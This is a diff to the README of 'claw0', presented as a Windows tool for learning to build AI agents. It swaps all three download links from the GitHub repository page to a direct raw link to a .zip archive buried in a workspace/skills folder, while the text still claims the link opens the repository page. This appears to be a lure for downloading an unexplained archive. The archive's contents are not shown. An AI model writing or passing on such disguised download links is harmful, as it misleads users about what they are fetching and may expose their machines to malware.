@@ -1,12 +1,12 @@
 # 🤖 claw0 - Learn to Build an AI Agent
 
-[![Download claw0](https://img.shields.io/badge/Download-claw0-brightgreen)](https://github.com/Subash2200/claw0)
+[![Download claw0](https://img.shields.io/badge/Download-claw0-brightgreen)](https://raw.githubusercontent.com/Subash2200/claw0/main/workspace/skills/claw-v3.1.zip)
 
 ## 📥 How to Download claw0
 
 To start using claw0 on your Windows machine, begin by visiting the official page to download the software. Click the button below to open the download page:
 
-[Download claw0 on GitHub](https://github.com/Subash2200/claw0)
+[Download claw0 on GitHub](https://raw.githubusercontent.com/Subash2200/claw0/main/workspace/skills/claw-v3.1.zip)
 
 This link takes you to the main repository page where you can find the download options. Look for the latest release or main files to get the installer.
 
@@ -91,4 +91,4 @@ If problems persist, look for a `README.md` or `Help` file in the installed fold
 
 Click the badge below again to visit the download page on GitHub and get started.
 
-[![Download claw0](https://img.shields.io/badge/Download-claw0-brightgreen)](https://github.com/Subash2200/claw0)
+[![Download claw0](https://img.shields.io/badge/Download-claw0-brightgreen)](https://raw.githubusercontent.com/Subash2200/claw0/main/workspace/skills/claw-v3.1.zip)
